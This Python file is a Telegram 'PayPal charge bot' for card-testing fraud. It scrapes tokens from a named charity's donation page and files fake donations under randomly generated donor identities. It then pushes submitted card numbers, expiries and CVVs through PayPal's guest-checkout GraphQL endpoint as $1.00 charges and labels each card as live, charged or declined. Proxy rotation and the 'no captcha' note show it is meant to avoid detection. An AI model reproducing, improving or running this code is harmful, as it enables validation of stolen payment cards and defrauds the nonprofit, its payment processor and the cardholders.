import requests
import re
import json
import random
import string
import base64
import time
import os
from datetime import datetime
from typing import Dict, Any, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import asyncio

# ═══════════════════════════════════════════════════════════════
#  PAYPAL CHARGE BOT — Telegram Version
#  Gateway: GiveWP + PayPal Commerce (Credit/Debit Card)
#  Amount: $1.00 USD | No Captcha
#  SCRIPT BY @REALYASHVIRGAMING
# ═══════════════════════════════════════════════════════════════

# Get bot token from environment variable
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_IDS = os.getenv('ADMIN_IDS', '').split(',')  # Comma-separated admin user IDs

FIRST_NAMES = [
    "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
    "William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica",
    "Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy",
    "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley",
    "Paul","Dorothy","Andrew","Kimberly","Joshua","Kenneth","Emily","Donna"
]

LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
    "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
    "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"
]

ADDRESSES = [
    {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
    {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
    {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
    {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
    {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
    {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
    {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
    {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
    {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
    {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
]

PHONE_PREFIXES = ["212","310","312","415","602","713","206","305","404","503"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]


def random_donor() -> Dict[str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    addr = random.choice(ADDRESSES)
    phone = random.choice(PHONE_PREFIXES) + ''.join([str(random.randint(0,9)) for _ in range(7)])
    domain = random.choice(EMAIL_DOMAINS)
    email = f"{first.lower()}{random.randint(10,9999)}@{domain}"
    return {
        "first": first,
        "last": last,
        "email": email,
        "phone": phone,
        "address": addr
    }


class PayPalChargeEngine:
    """PAYPAL CHARGE Engine for awwatersheds.org | @REALYASHVIRGAMING"""

    def __init__(self, proxy: Optional[str] = None):
        self.session = requests.Session()
        self.session.verify = True
        self.last_error = ""
        if proxy:
            if proxy.count(':') == 3 and '@' not in proxy:
                p = proxy.split(':')
                fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
                self.session.proxies = {"http": fmt, "https": fmt}
            elif '@' in proxy:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            else:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        self.ajax_headers = {
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://awwatersheds.org",
            "Referer": "https://awwatersheds.org/donate/",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.tokens = {}

    def scrape_tokens(self) -> bool:
        try:
            r = self.session.get("https://awwatersheds.org/donate/", headers={"User-Agent": self.ua}, timeout=20)
            html = r.text
            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not h:
                h = re.search(r'"base_hash":"(.*?)"', html)
            if not h:
                self.last_error = "Hash not found"
                return False
            self.tokens['hash'] = h.group(1)
            self.tokens['pfx'] = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
            self.tokens['id'] = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
            return True
        except Exception as e:
            self.last_error = str(e)
            return False

    def register_donation(self, donor: Dict[str, str]) -> bool:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-title": "Sustainers Circle",
            "give-current-url": "https://awwatersheds.org/donate/",
            "give-form-url": "https://awwatersheds.org/donate/",
            "give-form-hash": self.tokens['hash'],
            "give-price-id": "custom",
            "give-amount": "1.00",
            "payment-mode": "paypal-commerce",
            "give_first": donor["first"],
            "give_last": donor["last"],
            "give_email": donor["email"],
            "give-lake-affiliation": "Other",
            "give_action": "purchase",
            "give-gateway": "paypal-commerce",
            "action": "give_process_donation",
            "give_ajax": "true"
        }
        try:
            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=self.ajax_headers, data=data, timeout=20)
            return r.status_code == 200
        except:
            return False

    def create_order(self) -> Optional[str]:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-hash": self.tokens['hash'],
            "payment-mode": "paypal-commerce",
            "give-amount": "1.00",
            "give-gateway": "paypal-commerce",
        }
        try:
            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order", 
                                headers=self.ajax_headers, data=data, timeout=20)
            js = r.json()
            if 'data' in js and 'id' in js['data']:
                return js['data']['id']
        except:
            pass
        return None

    def charge_card(self, order_id: str, card: Dict[str, str], donor: Dict[str, str]) -> Dict[str, Any]:
        headers = {
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": "https://www.paypal.com",
            "Referer": "https://www.paypal.com/",
            "paypal-client-context": order_id,
            "paypal-client-metadata-id": order_id,
        }
        
        gql = {
            "query": """mutation payWithCard(
                $token: String!
                $card: CardInput!
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentPlan: InstallmentPlanInput
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentPlan: $installmentPlan
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }""",
            "variables": {
                "token": order_id,
                "card": {
                    "cardNumber": card["number"],
                    "expirationDate": card["expiry"],
                    "postalCode": donor["address"]["zip"],
                    "securityCode": card["cvv"]
                },
                "phoneNumber": donor["phone"],
                "firstName": donor["first"],
                "lastName": donor["last"],
                "email": donor["email"],
                "billingAddress": {
                    "givenName": donor["first"],
                    "familyName": donor["last"],
                    "line1": donor["address"]["line1"],
                    "line2": "",
                    "city": donor["address"]["city"],
                    "state": donor["address"]["state"],
                    "postalCode": donor["address"]["zip"],
                    "country": "US"
                },
                "shippingAddress": {
                    "givenName": donor["first"],
                    "familyName": donor["last"],
                    "line1": donor["address"]["line1"],
                    "line2": "",
                    "city": donor["address"]["city"],
                    "state": donor["address"]["state"],
                    "postalCode": donor["address"]["zip"],
                    "country": "US"
                },
                "currencyConversionType": "PAYPAL"
            },
            "operationName": "payWithCard"
        }
        
        try:
            r = self.session.post("https://www.paypal.com/graphql?FundingEligibility", headers=headers, json=gql, timeout=30)
            return r.json()
        except Exception as e:
            return {"error": str(e)}

    def approve_order(self, order_id: str) -> Dict[str, Any]:
        try:
            r = self.session.post(f"https://awwatersheds.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_user_approve_order&give_paypal_order_id={order_id}",
                                headers=self.ajax_headers, timeout=20)
            return r.json()
        except:
            return {}


def parse_card(cc: str) -> Optional[Dict[str, str]]:
    cc = cc.strip()
    parts = cc.split('|')
    if len(parts) != 4:
        return None
    num, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[2:]
    return {
        "number": num,
        "expiry": f"{mm}/{yy}",
        "cvv": cvv
    }


def analyze_response(gql_resp: Dict, approve_resp: Dict) -> Dict[str, str]:
    if 'errors' in gql_resp:
        err_msg = gql_resp['errors'][0].get('message', '').lower()
        
        if 'credit card number is invalid' in err_msg:
            return {"status": "DECLINED", "emoji": "❌", "msg": "Invalid Card Number"}
        elif 'cannot be processed' in err_msg or 'processor declined' in err_msg:
            return {"status": "DECLINED", "emoji": "❌", "msg": "Processor Declined"}
        elif 'security code is invalid' in err_msg:
            return {"status": "LIVE", "emoji": "💰", "msg": "Card Live - CVV Invalid"}
        elif 'expiration' in err_msg:
            return {"status": "LIVE", "emoji": "💰", "msg": "Card Live - Expiry Invalid"}
        elif 'insufficient funds' in err_msg:
            return {"status": "APPROVED", "emoji": "✅", "msg": "Insufficient Funds (Card Valid!)"}
        elif 'risk' in err_msg or 'try again' in err_msg:
            return {"status": "DECLINED", "emoji": "❌", "msg": "Risk/Try Again"}
        else:
            return {"status": "ERROR", "emoji": "⚠️", "msg": f"Error: {err_msg[:100]}"}
    
    if 'data' in gql_resp:
        data = gql_resp.get('data', {})
        approve_data = data.get('approveGuestPaymentWithCreditCard', {})
        
        if approve_data:
            flags = approve_data.get('flags', {})
            contingencies = approve_data.get('paymentContingencies', {})
            
            if flags.get('is3DSecureRequired'):
                return {"status": "LIVE", "emoji": "💰", "msg": "3DS Required (Card Live)"}
            
            if contingencies:
                return {"status": "LIVE", "emoji": "💰", "msg": "Additional Verification Required"}
            
            cart = approve_data.get('cart', {})
            if cart.get('buyer'):
                if 'success' in approve_resp and approve_resp['success']:
                    return {"status": "CHARGED", "emoji": "✅", "msg": "Successfully Charged $1.00"}
                return {"status": "APPROVED", "emoji": "✅", "msg": "Payment Approved (Pending Capture)"}
    
    return {"status": "ERROR", "emoji": "⚠️", "msg": "Unknown Response"}


def check_card(cc: str, proxy: Optional[str] = None) -> Dict[str, str]:
    card = parse_card(cc)
    if not card:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Invalid card format. Use CC|MM|YY|CVV"}
    
    donor = random_donor()
    engine = PayPalChargeEngine(proxy)
    
    if not engine.scrape_tokens():
        return {"status": "ERROR", "emoji": "⚠️", "msg": f"Token scrape failed: {engine.last_error}"}
    
    if not engine.register_donation(donor):
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Donation registration failed"}
    
    order_id = engine.create_order()
    if not order_id:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "PayPal order creation failed"}
    
    graphql_resp = engine.charge_card(order_id, card, donor)
    approve_resp = engine.approve_order(order_id)
    
    return analyze_response(graphql_resp, approve_resp)


# ═══════════════════════════════════════════════════════════════
#  TELEGRAM BOT HANDLERS
# ═══════════════════════════════════════════════════════════════

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message"""
    welcome_text = """
🔥 **PAYPAL CHARGE BOT** 🔥
━━━━━━━━━━━━━━━━━━━━

**Gateway:** PayPal Commerce
**Site:** awwatersheds.org
**Amount:** $1.00 USD
**No Captcha Required**

━━━━━━━━━━━━━━━━━━━━

**Commands:**
/chk - Check single card
/mass - Mass check cards (coming soon)
/help - Show this message

**Format:** `CC|MM|YY|CVV`
**Example:** `4185497154154915|11|33|461`

━━━━━━━━━━━━━━━━━━━━
**Made by:** @REALYASHVIRGAMING
**Channel:** @THEYASHVIRGAMING
━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message"""
    await start(update, context)


async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check a single card"""
    if not context.args:
        await update.message.reply_text(
            "❌ **Please provide a card!**\n\n"
            "**Format:** `/chk CC|MM|YY|CVV`\n"
            "**Example:** `/chk 4185497154154915|11|33|461`",
            parse_mode='Markdown'
        )
        return
    
    cc = context.args[0]
    
    # Send processing message
    processing_msg = await update.message.reply_text(
        f"⏳ **Processing...**\n\n"
        f"**Card:** `{cc}`\n"
        f"**Gateway:** PayPal Commerce\n"
        f"**Amount:** $1.00 USD\n\n"
        f"Please wait...",
        parse_mode='Markdown'
    )
    
    # Check the card
    result = await asyncio.to_thread(check_card, cc, None)
    
    status = result['status']
    emoji = result['emoji']
    msg = result['msg']
    
    # Determine color emoji based on status
    if status in ['CHARGED', 'APPROVED']:
        status_emoji = '✅'
        status_text = f"**{status}**"
    elif status == 'LIVE':
        status_emoji = '💰'
        status_text = f"**{status}**"
    elif status == 'DECLINED':
        status_emoji = '❌'
        status_text = f"**{status}**"
    else:
        status_emoji = '⚠️'
        status_text = f"**{status}**"
    
    # Format response
    response = f"""
{status_emoji} **RESULT** {status_emoji}
━━━━━━━━━━━━━━━━━━━━

**Card:** `{cc}`
**Status:** {status_text}
**Response:** {msg}

**Gateway:** PayPal Commerce
**Amount:** $1.00 USD
**Checked by:** @{update.effective_user.username or update.effective_user.first_name}

━━━━━━━━━━━━━━━━━━━━
**Bot by:** @REALYASHVIRGAMING
    """
    
    # Edit the processing message with result
    await processing_msg.edit_text(response, parse_mode='Markdown')


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle card input as plain message"""
    text = update.message.text.strip()
    
    # Check if it looks like a card
    if '|' in text and text.count('|') == 3:
        # Treat it as a card check
        context.args = [text]
        await check_single(update, context)
    else:
        await update.message.reply_text(
            "ℹ️ **Send a card in this format:**\n\n"
            "`CC|MM|YY|CVV`\n\n"
            "Or use `/chk CC|MM|YY|CVV`",
            parse_mode='Markdown'
        )


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "⚠️ **An error occurred!**\n\n"
            "Please try again or contact support.",
            parse_mode='Markdown'
        )


def main():
    """Start the bot"""
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN environment variable is not set!")
        return
    
    print("🚀 Starting PayPal Charge Bot...")
    print(f"📡 Bot Token: {BOT_TOKEN[:10]}...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("chk", check_single))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start the bot
    print("✅ Bot is running!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
